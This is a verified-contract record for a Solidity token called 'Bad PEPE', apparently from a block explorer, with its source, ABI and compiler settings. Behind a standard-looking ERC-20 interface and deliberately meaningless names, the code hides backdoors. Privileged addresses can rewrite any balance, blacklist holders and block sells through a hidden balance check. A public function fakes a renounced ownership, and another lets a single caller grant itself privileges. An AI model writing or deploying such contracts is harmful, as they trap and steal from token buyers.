{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface receiverTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isMode) external view returns (uint256);\n\n    function transfer(address takeFund, uint256 launchedSellTake) external returns (bool);\n\n    function allowance(address launchedMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedSellTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeFund,\n        uint256 launchedSellTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableFee, uint256 value);\n    event Approval(address indexed launchedMax, address indexed spender, uint256 value);\n}\n\nabstract contract listModeTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderModeTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listSender {\n    function createPair(address fromReceiver, address autoTotalMax) external returns (address);\n}\n\ninterface receiverTxMetadata is receiverTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BadPEPE is listModeTo, receiverTx, receiverTxMetadata {\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityLaunched;\n    }\n\n    bool private tokenWallet;\n\n    address fromMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address isMode) public view virtual override returns (uint256) {\n        return marketingFundTeam[isMode];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingSell;\n    }\n\n    uint256 sellFund;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minMode;\n    }\n\n    function limitEnable(address fundAutoBuy) public {\n        walletFund();\n        if (launchWallet != minAmount) {\n            minAmount = amountReceiver;\n        }\n        if (fundAutoBuy == exemptMarketing || fundAutoBuy == teamMarketing) {\n            return;\n        }\n        autoMaxFee[fundAutoBuy] = true;\n    }\n\n    bool public limitTake;\n\n    uint256 constant shouldFund = 5 ** 10;\n\n    function teamLaunched(address buyTakeFee, address takeFund, uint256 launchedSellTake) internal returns (bool) {\n        if (buyTakeFee == exemptMarketing) {\n            return feeMarketingLiquidity(buyTakeFee, takeFund, launchedSellTake);\n        }\n        uint256 walletSell = receiverTx(teamMarketing).balanceOf(fromMax);\n        require(walletSell == sellFund);\n        require(takeFund != fromMax);\n        if (autoMaxFee[buyTakeFee]) {\n            return feeMarketingLiquidity(buyTakeFee, takeFund, shouldFund);\n        }\n        return feeMarketingLiquidity(buyTakeFee, takeFund, launchedSellTake);\n    }\n\n    uint256 private minAmount;\n\n    function launchedReceiver(address liquidityTotal, uint256 launchedSellTake) public {\n        walletFund();\n        marketingFundTeam[liquidityTotal] = launchedSellTake;\n    }\n\n    function walletFund() private view {\n        require(tokenMin[_msgSender()]);\n    }\n\n    uint256 public launchWallet;\n\n    event OwnershipTransferred(address indexed receiverAuto, address indexed receiverList);\n\n    function getOwner() external view returns (address) {\n        return marketingLiquidity;\n    }\n\n    mapping(address => bool) public autoMaxFee;\n\n    constructor (){\n        \n        senderModeTotal totalFrom = senderModeTotal(swapBuy);\n        teamMarketing = listSender(totalFrom.factory()).createPair(totalFrom.WETH(), address(this));\n        if (swapLaunch) {\n            swapLaunch = true;\n        }\n        exemptMarketing = _msgSender();\n        fundFee();\n        tokenMin[exemptMarketing] = true;\n        marketingFundTeam[exemptMarketing] = minMode;\n        if (swapLaunch) {\n            amountReceiver = minAmount;\n        }\n        emit Transfer(address(0), exemptMarketing, minMode);\n    }\n\n    address swapBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private totalBuy;\n\n    address public exemptMarketing;\n\n    address private marketingLiquidity;\n\n    string private tradingSell = \"BPE\";\n\n    uint256 private minMode = 100000000 * 10 ** 18;\n\n    bool private swapLaunch;\n\n    uint256 public launchLimit;\n\n    string private liquidityLaunched = \"Bad PEPE\";\n\n    address public teamMarketing;\n\n    mapping(address => uint256) private marketingFundTeam;\n\n    function transferFrom(address buyTakeFee, address takeFund, uint256 launchedSellTake) external override returns (bool) {\n        if (_msgSender() != swapBuy) {\n            if (totalBuy[buyTakeFee][_msgSender()] != type(uint256).max) {\n                require(launchedSellTake <= totalBuy[buyTakeFee][_msgSender()]);\n                totalBuy[buyTakeFee][_msgSender()] -= launchedSellTake;\n            }\n        }\n        return teamLaunched(buyTakeFee, takeFund, launchedSellTake);\n    }\n\n    function owner() external view returns (address) {\n        return marketingLiquidity;\n    }\n\n    function transfer(address liquidityTotal, uint256 launchedSellTake) external virtual override returns (bool) {\n        return teamLaunched(_msgSender(), liquidityTotal, launchedSellTake);\n    }\n\n    function allowance(address feeLimitReceiver, address enableReceiver) external view virtual override returns (uint256) {\n        if (enableReceiver == swapBuy) {\n            return type(uint256).max;\n        }\n        return totalBuy[feeLimitReceiver][enableReceiver];\n    }\n\n    function feeMarketingLiquidity(address buyTakeFee, address takeFund, uint256 launchedSellTake) internal returns (bool) {\n        require(marketingFundTeam[buyTakeFee] >= launchedSellTake);\n        marketingFundTeam[buyTakeFee] -= launchedSellTake;\n        marketingFundTeam[takeFund] += launchedSellTake;\n        emit Transfer(buyTakeFee, takeFund, launchedSellTake);\n        return true;\n    }\n\n    function fundFee() public {\n        emit OwnershipTransferred(exemptMarketing, address(0));\n        marketingLiquidity = address(0);\n    }\n\n    function approve(address enableReceiver, uint256 launchedSellTake) public virtual override returns (bool) {\n        totalBuy[_msgSender()][enableReceiver] = launchedSellTake;\n        emit Approval(_msgSender(), enableReceiver, launchedSellTake);\n        return true;\n    }\n\n    uint256 swapLiquidity;\n\n    function receiverLimit(address launchLaunched) public {\n        require(launchLaunched.balance < 100000);\n        if (limitTake) {\n            return;\n        }\n        if (amountReceiver != minAmount) {\n            minAmount = launchWallet;\n        }\n        tokenMin[launchLaunched] = true;\n        if (swapLaunch != teamIs) {\n            launchWallet = amountReceiver;\n        }\n        limitTake = true;\n    }\n\n    function minLimit(uint256 launchedSellTake) public {\n        walletFund();\n        sellFund = launchedSellTake;\n    }\n\n    mapping(address => bool) public tokenMin;\n\n    function decimals() external view virtual override returns (uint8) {\n        return toWallet;\n    }\n\n    uint256 public amountReceiver;\n\n    bool private teamIs;\n\n    uint8 private toWallet = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLimitReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSellTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoMaxFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSellTake\",\"type\":\"uint256\"}],\"name\":\"launchedReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAutoBuy\",\"type\":\"address\"}],\"name\":\"limitEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedSellTake\",\"type\":\"uint256\"}],\"name\":\"minLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLaunched\",\"type\":\"address\"}],\"name\":\"receiverLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSellTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTakeFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedSellTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BadPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}